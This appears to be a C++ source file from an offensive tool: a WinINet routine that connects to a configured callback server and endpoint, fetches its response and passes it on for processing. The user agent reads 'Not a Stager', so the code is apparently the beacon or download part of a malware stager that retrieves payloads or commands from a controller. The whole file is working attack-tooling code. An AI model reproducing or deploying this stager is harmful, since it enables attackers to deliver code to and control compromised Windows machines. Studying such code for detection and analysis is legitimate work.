#include "pch.h"

#include <wininet.h>
#pragma comment(lib, "Wininet.lib")


std::string err(const char *err) {

	printf("Error: %s (%u)\n",err, ::GetLastError());
	return "";

}

wchar_t* convertCharArrayToLPCWSTR(const char* charArray) {

	wchar_t* wString = new wchar_t[4096];
	ZeroMemory(wString, 4096 * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;

}

std::string reader(HANDLE hHTTPrequest) {

	std::string response;
	response.clear();

	char buff[2048];
	DWORD dwBytesRead = 0;
	::ZeroMemory(buff, sizeof(buff));

	while (::InternetReadFile(hHTTPrequest, buff, sizeof(buff), &dwBytesRead) == TRUE && dwBytesRead != 0) {

		response.append(buff, dwBytesRead);
		if (dwBytesRead == 0)
			break;

	}

	if (!response.empty())
		return cleaner(response); 

	return response;

}


std::string requester() {

	DWORD timeout = TIMEOUT;

	if (!::InternetSetOptionA(NULL, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout))) {
	
		return err("Unable to Set Internet Options");
	
	}

	HANDLE hInternet = ::InternetOpenW(L"Not a Stager", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) {
	
		return err("Unable open internet handle");
	
	}

	HANDLE hConnection = ::InternetConnectW(hInternet, convertCharArrayToLPCWSTR(CALLBACK_SERVER), (DWORD)CALLBACK_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnection) {
	
		return err("Unable to Get Connection Handle");
	
	}

	LPCWSTR file = convertCharArrayToLPCWSTR(CALLBACK_ENDPOINT);	
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION;

	HANDLE hHTTPrequest = ::HttpOpenRequestW(hConnection, L"GET", file, L"HTTP/1.1", NULL, NULL, flags, NULL);
	if (!hHTTPrequest) {

		return err("Unable to Obtain HTTP Handle");

	}
	else {

		if (!::HttpSendRequestW(hHTTPrequest, NULL, NULL, NULL, NULL)) {
		
			err("Unable to Send HTTP Request");
		
		} 

		return reader(hHTTPrequest);
	
	}

}